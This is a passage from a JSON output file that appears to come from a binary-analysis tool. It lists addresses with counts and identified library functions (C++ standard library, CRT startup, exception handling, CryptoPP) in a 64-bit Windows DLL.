              "count": 75
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442634864
              },
              "count": 82
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442635156
              },
              "count": 102
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442635748
              },
              "count": 62
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442636388
              },
              "count": 110
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442637292
              },
              "count": 69
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442637320
              },
              "count": 144
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638200
              },
              "count": 72
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638652
              },
              "count": 11
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638664
              },
              "count": 60
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638812
              },
              "count": 38
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638884
              },
              "count": 18
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638916
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638924
              },
              "count": 24
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638984
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442638992
              },
              "count": 88
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442639224
              },
              "count": 70
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442639804
              },
              "count": 21
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442640036
              },
              "count": 21
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442640746
              },
              "count": 14
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442641356
              },
              "count": 30
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442641836
              },
              "count": 71
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442642044
              },
              "count": 94
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442647068
              },
              "count": 73
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442647232
              },
              "count": 41
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442647300
              },
              "count": 99
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442647816
              },
              "count": 62
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442648084
              },
              "count": 231
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442649392
              },
              "count": 37
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442649500
              },
              "count": 144
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442650244
              },
              "count": 32
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442651916
              },
              "count": 68
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442652812
              },
              "count": 141
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442653784
              },
              "count": 65
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442653972
              },
              "count": 47
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442654236
              },
              "count": 137
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442656304
              },
              "count": 50
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442656560
              },
              "count": 78
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657508
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657528
              },
              "count": 72
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657756
              },
              "count": 47
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657844
              },
              "count": 87
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658156
              },
              "count": 45
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658332
              },
              "count": 81
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658672
              },
              "count": 62
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659060
              },
              "count": 93
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659476
              },
              "count": 86
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659732
              },
              "count": 77
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659928
              },
              "count": 134
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661284
              },
              "count": 69
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661568
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661620
              },
              "count": 141
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442662628
              },
              "count": 79
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665048
              },
              "count": 77
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665288
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665428
              },
              "count": 43
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667252
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667272
              },
              "count": 124
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667748
              },
              "count": 83
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668256
              },
              "count": 21
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668476
              },
              "count": 109
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668640
              },
              "count": 30
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668688
              },
              "count": 72
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668916
              },
              "count": 56
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669068
              },
              "count": 93
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669608
              },
              "count": 50
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669716
              },
              "count": 121
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669724
              },
              "count": 121
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442670684
              },
              "count": 77
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671120
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671504
              },
              "count": 28
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671932
              },
              "count": 74
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442672244
              },
              "count": 45
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442672416
              },
              "count": 9
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442672480
              },
              "count": 163
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442674144
              },
              "count": 48
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442674336
              },
              "count": 152
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680416
              },
              "count": 39
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680584
              },
              "count": 33
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680692
              },
              "count": 33
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680864
              },
              "count": 39
            }
          ]
        },
        "library_functions": [
          {
            "address": {
              "type": "absolute",
              "value": 6442455072
            },
            "name": "?dtor$0@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455084
            },
            "name": "?dtor$1@?0??Zero@GFP2Element@CryptoPP@@SAAEBV12@XZ@4HA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455360
            },
            "name": "??__Efout@std@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455616
            },
            "name": "printf"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455808
            },
            "name": "??0exception@std@@QEAA@AEBV01@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455872
            },
            "name": "?what@exception@std@@UEBAPEBDXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442455904
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456016
            },
            "name": "??0bad_array_new_length@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456064
            },
            "name": "?_Throw_bad_array_new_length@std@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456320
            },
            "name": "?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456336
            },
            "name": "?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456400
            },
            "name": "?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456432
            },
            "name": "?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442456944
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457120
            },
            "name": "??0_System_error@std@@QEAA@AEBV01@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457344
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457392
            },
            "name": "??0bad_array_new_length@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457440
            },
            "name": "?_Throw_bad_array_new_length@std@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457584
            },
            "name": "??1_Locinfo@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457744
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457760
            },
            "name": "?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457792
            },
            "name": "??1locale@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442457840
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442458464
            },
            "name": "?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442458496
            },
            "name": "?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442458528
            },
            "name": "??_G?$ctype@D@std@@MEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442458928
            },
            "name": "??_Gios_base@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442464544
            },
            "name": "?ReadNameDictFromStream@CPropertySection@@QEAAHPEAUIStream@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442471440
            },
            "name": "?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAAXAEBVlocale@2@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442473840
            },
            "name": "?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAAHXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442473952
            },
            "name": "?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAAHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442476752
            },
            "name": "?pbackfail@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@MEAAHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442477360
            },
            "name": "??1?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@UEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442477632
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442477648
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442478064
            },
            "name": "?uflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAHXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442478128
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442478144
            },
            "name": "??1?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442478544
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442478576
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479184
            },
            "name": "??_GCAnimationGroup@@QEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479248
            },
            "name": "??_G?$basic_ifstream@DU?$char_traits@D@std@@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479312
            },
            "name": "??_G?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479552
            },
            "name": "??_G?$basic_ostream@DU?$char_traits@D@std@@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479664
            },
            "name": "??_G?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442479728
            },
            "name": "??_G?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442480032
            },
            "name": "??_G?$basic_istream@DU?$char_traits@D@std@@@std@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442480144
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442480208
            },
            "name": "?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442483712
            },
            "name": "??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442483904
            },
            "name": "?do_length@?$codecvt@DDU_Mbstatet@@@std@@MEBAHAEAU_Mbstatet@@PEBD1_K@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442483936
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442484000
            },
            "name": "?_Initcvt@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IEAAXAEBV?$codecvt@DDU_Mbstatet@@@2@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442484128
            },
            "name": "?_Endwrite@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IEAA_NXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442486176
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442486416
            },
            "name": "?do_thousands_sep@?$numpunct@D@std@@MEBADXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442486432
            },
            "name": "?do_decimal_point@?$numpunct@D@std@@MEBADXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442486448
            },
            "name": "?CalcExpectedDockedRect@CGlobalUtils@@QEAAXAEAVCPaneContainerManager@@PEAVCWnd@@VCPoint@@AEAVCRect@@AEAHPEAPEAVCDockablePane@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442488064
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442488112
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442488544
            },
            "name": "?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442489984
            },
            "name": "??_G?$numpunct@D@std@@MEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442496976
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442503696
            },
            "name": "??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442515500
            },
            "name": "??0_Init_locks@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442515568
            },
            "name": "??0_Lockit@std@@QEAA@H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442515628
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442515688
            },
            "name": "??1_Lockit@std@@QEAA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516476
            },
            "name": "?_Syserror_map@std@@YAPEBDH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516516
            },
            "name": "??0_Locimp@locale@std@@AEAA@_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516652
            },
            "name": "??4?$_Yarn@D@std@@QEAAAEAV01@PEBD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516772
            },
            "name": "??_G_Locimp@locale@std@@MEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516864
            },
            "name": "?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442516928
            },
            "name": "?_Init@locale@std@@CAPEAV_Locimp@12@_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517296
            },
            "name": "?_Locinfo_ctor@_Locinfo@std@@SAXPEAV12@PEBD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517404
            },
            "name": "?_Locinfo_dtor@_Locinfo@std@@SAXPEAV12@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517432
            },
            "name": "?_New_Locimp@_Locimp@locale@std@@CAPEAV123@_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517480
            },
            "name": "?_Setgloballocale@locale@std@@CAXPEAX@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517532
            },
            "name": "_Deletegloballocale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517592
            },
            "name": "tidy_global"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442517644
            },
            "name": "_Getctype"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442518144
            },
            "name": "_Getcvt"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442518620
            },
            "name": "?_Addstd@ios_base@std@@SAXPEAV12@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442518736
            },
            "name": "?_Ios_base_dtor@ios_base@std@@CAXPEAV12@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442518856
            },
            "name": "?_Tidy@ios_base@std@@AEAAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442519012
            },
            "name": "_Query_perf_frequency"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442519408
            },
            "name": "_Stoullx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442520148
            },
            "name": "_Stoulx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442521320
            },
            "name": "_Mtxinit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442521352
            },
            "name": "?_Atexit@@YAXP6AXXZ@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522176
            },
            "name": "?initialize_pointers@@YAHXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522304
            },
            "name": "__security_check_cookie"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522344
            },
            "name": "??_Gtype_info@@UEAAPEAXI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522388
            },
            "name": "??2@YAPEAX_K@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522448
            },
            "name": "?dllmain_crt_dispatch@@YAHQEAUHINSTANCE__@@KQEAX@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522528
            },
            "name": "?dllmain_crt_process_attach@@YAHQEAUHINSTANCE__@@QEAX@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442522808
            },
            "name": "?dllmain_crt_process_detach@@YAH_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523296
            },
            "name": "__scrt_acquire_startup_lock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523356
            },
            "name": "__scrt_dllmain_after_initialize_c"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523408
            },
            "name": "__scrt_dllmain_before_initialize_c"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523432
            },
            "name": "__scrt_dllmain_crt_thread_attach"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523472
            },
            "name": "__scrt_dllmain_crt_thread_detach"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523496
            },
            "name": "__scrt_dllmain_exception_filter"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523592
            },
            "name": "__scrt_dllmain_uninitialize_c"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523640
            },
            "name": "__scrt_dllmain_uninitialize_critical"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523720
            },
            "name": "__scrt_initialize_onexit_tables"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442523860
            },
            "name": "__scrt_is_nonwritable_in_current_image"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524012
            },
            "name": "__scrt_release_startup_lock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524048
            },
            "name": "__scrt_uninitialize_crt"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524092
            },
            "name": "_onexit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524152
            },
            "name": "atexit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524176
            },
            "name": "__GSHandlerCheck"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524208
            },
            "name": "__GSHandlerCheckCommon"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442524300
            },
            "name": "__GSHandlerCheck_EH4"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525168
            },
            "name": "_alloca_probe"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525248
            },
            "name": "__raise_securityfailure"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525300
            },
            "name": "__report_gsfailure"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525532
            },
            "name": "__report_securityfailure"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525692
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442525804
            },
            "name": "capture_previous_context"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442526136
            },
            "name": "__scrt_initialize_default_local_stdio_options"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442526180
            },
            "name": "__scrt_fastfail"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442526628
            },
            "name": "_Curl_tls_keylog_enabled"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442526640
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442526724
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442527220
            },
            "name": "?ExecutionInCatch@__FrameHandler3@@SA_NPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442527264
            },
            "name": "?ExecutionInCatch@__FrameHandler4@@SA_NPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442527272
            },
            "name": "?FrameUnwindToEmptyState@__FrameHandler3@@SAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442527372
            },
            "name": "?FrameUnwindToEmptyState@__FrameHandler4@@SAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442527632
            },
            "name": "?GetEstablisherFrame@__FrameHandler4@@SAPEA_KPEA_KPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@0@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442528340
            },
            "name": "?UnwindNestedFrames@__FrameHandler3@@SAXPEA_KPEAUEHExceptionRecord@@PEAU_CONTEXT@@0PEAXPEBU_s_FuncInfo@@HHPEBU_s_HandlerType@@PEAU_xDISPATCHER_CONTEXT@@E@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442528600
            },
            "name": "?UnwindNestedFrames@__FrameHandler4@@SAXPEA_KPEAUEHExceptionRecord@@PEAU_CONTEXT@@0PEAXPEAUFuncInfo4@FH4@@HHPEAUHandlerType4@5@PEAU_xDISPATCHER_CONTEXT@@E@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529340
            },
            "name": "_CreateFrameInfo"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529400
            },
            "name": "_FindAndUnlinkFrame"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529484
            },
            "name": "_GetImageBase"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529504
            },
            "name": "_GetThrowImageBase"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529524
            },
            "name": "_SetImageBase"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529548
            },
            "name": "_SetThrowImageBase"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529572
            },
            "name": "__CxxFrameHandler3"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529708
            },
            "name": "__CxxFrameHandler4"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442529900
            },
            "name": "__DestructExceptionObject"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530016
            },
            "name": "_IsExceptionObjectToBeDestroyed"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530064
            },
            "name": "__AdjustPointer"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530100
            },
            "name": "__FrameUnwindFilter"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530216
            },
            "name": "__std_exception_copy"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530360
            },
            "name": "__std_exception_destroy"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530412
            },
            "name": "_purecall"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530440
            },
            "name": "_CxxThrowException"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442530608
            },
            "name": "__uncaught_exception"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531176
            },
            "name": "__vcrt_initialize"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531216
            },
            "name": "__vcrt_thread_attach"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531236
            },
            "name": "?StaticInitialize@CAtlStringMgr@ATL@@CA_NXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531252
            },
            "name": "__vcrt_uninitialize"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531280
            },
            "name": "?StaticInitialize@CAtlStringMgr@ATL@@CA_NXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531296
            },
            "name": "__std_type_info_compare"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531336
            },
            "name": "__std_type_info_destroy_list"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531380
            },
            "name": "__vcrt_freefls"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531484
            },
            "name": "__vcrt_getptd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531512
            },
            "name": "__vcrt_getptd_noexit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531704
            },
            "name": "__vcrt_getptd_noinit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531784
            },
            "name": "__vcrt_initialize_ptd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442531976
            },
            "name": "?SetState@__FrameHandler3@@SAXPEA_KPEBU_s_FuncInfo@@H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442532408
            },
            "name": "??$BuildCatchObjectHelperInternal@V__FrameHandler3@@@@YAHPEAUEHExceptionRecord@@PEAXPEBU_s_HandlerType@@PEBU_s_CatchableType@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442532920
            },
            "name": "??$BuildCatchObjectHelperInternal@V__FrameHandler4@@@@YAHPEAUEHExceptionRecord@@PEAXPEAUHandlerType4@FH4@@PEBU_s_CatchableType@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442533436
            },
            "name": "??$BuildCatchObjectInternal@V__FrameHandler3@@@@YAXPEAUEHExceptionRecord@@PEAXPEBU_s_HandlerType@@PEBU_s_CatchableType@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442533628
            },
            "name": "??$BuildCatchObjectInternal@V__FrameHandler4@@@@YAXPEAUEHExceptionRecord@@PEAXPEAUHandlerType4@FH4@@PEBU_s_CatchableType@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442533824
            },
            "name": "??$CatchIt@V__FrameHandler3@@@@YAXPEAUEHExceptionRecord@@PEA_KPEAU_CONTEXT@@PEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@PEBU_s_HandlerType@@PEBU_s_CatchableType@@PEBU_s_TryBlockMapEntry@@H1EE@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442534036
            },
            "name": "??$CatchIt@V__FrameHandler4@@@@YAXPEAUEHExceptionRecord@@PEA_KPEAU_CONTEXT@@PEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@PEAUHandlerType4@4@PEBU_s_CatchableType@@PEAUTryBlockMapEntry4@4@H1EE@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442535480
            },
